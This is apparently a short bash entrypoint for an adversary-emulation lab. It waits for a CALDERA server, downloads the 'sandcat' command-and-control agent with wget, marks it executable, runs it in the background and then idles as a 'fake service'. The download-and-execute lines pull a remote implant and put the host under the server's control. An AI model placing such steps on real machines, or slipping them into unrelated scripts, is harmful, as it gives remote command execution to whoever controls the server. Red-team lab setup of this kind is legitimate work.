#!/usr/bin/env bash
set -e

CALDERA_URL="${CALDERA_URL:-http://caldera.web:8888}"
GROUP="${GROUP:-cluster}"

echo "Waiting for $CALDERA_URL ..."
until wget -qO- "$CALDERA_URL" >/dev/null 2>&1; do sleep 2; done

if [ "${WAIT:-0}" -eq 1 ]; then
  sleep 60
else
  sleep 30
fi

echo "Downloading sandcat payload..."
wget -qO /tmp/sandcat "$CALDERA_URL/file/download" \
  --header='file:sandcat.go' \
  --header='platform:linux' \
  --header="server:${CALDERA_URL}" \
  --header="group:${GROUP}"

chmod +x /tmp/sandcat

echo "Starting sandcat agent..."
/tmp/sandcat &

echo "Fake service running"
while true; do sleep 3600; done